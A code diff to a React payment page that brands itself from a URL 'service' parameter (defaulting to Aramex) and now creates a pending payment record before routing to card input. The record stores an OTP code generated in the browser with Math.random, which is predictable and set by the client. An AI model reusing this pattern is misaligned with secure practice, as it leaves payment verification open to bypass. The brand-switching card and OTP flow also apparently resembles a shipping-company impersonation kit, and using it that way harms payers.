@@ -3,7 +3,7 @@ import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { Shield } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink, useCreatePayment } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";
@@ -12,6 +12,7 @@ const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const createPayment = useCreatePayment();
 
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
@@ -59,8 +60,17 @@ const PaymentDetails = () => {
   // Format amount with currency symbol and name
   const formattedAmount = formatCurrency(amount, countryCode);
   
-  const handleProceed = () => {
-    navigate(`/pay/${id}/card-input`);
+  const handleProceed = async () => {
+    const paymentData = await createPayment.mutateAsync({
+      link_id: id!,
+      amount: amount,
+      status: 'pending',
+      otp_code: Math.floor(1000 + Math.random() * 9000).toString(),
+      otp_attempts: 0
+    });
+    
+    const paymentId = paymentData.data.id;
+    navigate(`/pay/${id}/card/${paymentId}`);
   };
   
   return (
